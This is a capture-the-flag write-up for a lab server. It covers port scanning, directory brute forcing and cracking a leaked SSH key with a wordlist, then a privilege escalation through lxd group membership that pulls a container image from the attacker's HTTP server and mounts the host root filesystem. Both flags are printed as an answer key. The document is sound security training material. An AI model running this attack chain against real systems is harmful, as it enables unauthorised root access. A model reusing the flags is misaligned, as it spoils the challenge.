## Description

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

## Solution

- i start by scanning the port:
	- `nmap -sC -sV 10.80.135.45`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- there are two services running on the server: a web server and SSH
- if i use a browser to go to 10.80.135.45:80, all i see is a simple static website
- looking at its source code, I see a comment talking about a `john` user, which might be useful later
- next step is to try some directory brute forcing using `ffuf`
	- `ffuf -u "http://10.82.149.237/FUZZ" -w dir_wordlist.txt -e txt`
	- i found two interesting directories: `uploads` and `secret`
- in the uploads directory, the only interesting thing is a word list, maybe it will be useful later 
- in the secret directory there is a secret RSA key
- maybe i can use JohnTheRipper to break the key using the word list found in uploads
	- first i save the rsa key to `id_rsa`
	- then i save the wordlist to `dict.txt`
	- then i modify the rsa key to a format understood by john:
		- `python3 /home/razvan/john/run/ssh2john.py /home/razvan/Downloads/id_rsa > /home/razvan/Downloads/key.hash`
	- i use the resulting key to get the passphrase for the key:
		- `sudo /home/razvan/john/run/john key.hash -w dict.txt` => **letmein**
- with this and the id_rsa key, and the username found earlier (john), i can connect to the ssh service running on the server
	- `ssh -i id_rsa john@10.82.149.237`
- but for that i also need to change the permissions on the id_rsa file to **600**:
	- `chmod 600 id_rsa`
- the connection works, i am now the user `john` on the `exploitable` machine
- using `ls` i see the user.txt file in the home folder and find the first flag:
	- **a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e**

- i use `id` to see the groups i am part of and see something interesting: i am part of the `lxd` group
- i can use this to run a LXD/LXC container with sudo privileges and mount the file system inside it to be able to see everything as root
- for this i need to create the container on my own machine first:
	- `sudo ./build-alpine`
- then i start a python server with which i will communicate from the target machine
	- `python3 -m http.server`
- on the target machine i can download the container created above
	- `wget http://192.168.190.92:8000/alpine-v3.23-x86_64-20251208_1833.tar.gz`
- then i add it to LXD:
	- `lxc image import … --alias myimage`
- then i make it a privileged container:
	- `lxc init myimage ignite -c security.privileged=true`
- i mount the host file system inside the container:
	- `lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true`
- now i can start the container and access it as root:
	- `lxc start ignite`
	- `lxc exec ignite /bin/sh`
- inside the container, i find the root.txt file and get the flag:
	- `find / -name "root.txt"`
	- `cat /mnt/root/root/root.txt`
	- **2e337b8c9f3aff0c2b3e8d4e6a7c88fc**

## Flags

User flag: **a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e**
Root flag: **2e337b8c9f3aff0c2b3e8d4e6a7c88fc**
